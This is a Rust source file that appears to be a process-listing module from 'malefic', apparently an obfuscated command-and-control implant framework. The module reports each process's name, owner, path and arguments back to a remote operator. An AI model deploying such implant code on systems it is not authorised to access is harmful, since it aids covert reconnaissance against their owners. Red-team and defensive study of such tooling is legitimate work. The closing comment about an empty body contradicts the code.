use crate::prelude::*;
use malefic_proto::proto::modulepb;
use malefic_proto::proto::modulepb::PsResponse;

pub struct Ps {}

#[async_trait]
#[module_impl("ps")]
impl Module for Ps {}

#[async_trait]
#[obfuscate]
impl ModuleImpl for Ps {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let _ = check_request!(receiver, Body::Request)?;

        let mut response = PsResponse::default();
        for (_, process) in malefic_process::get_processes()?.into_iter() {
            response.processes.push(modulepb::Process {
                name: process.name,
                pid: process.pid,
                ppid: process.ppid,
                arch: process.arch,
                owner: process.owner,
                path: process.path,
                args: process.args,
                uid: "".to_string(),
            });
        }

        Ok(TaskResult::new_with_body(id, Body::PsResponse(response))) // Response body is empty
    }
}
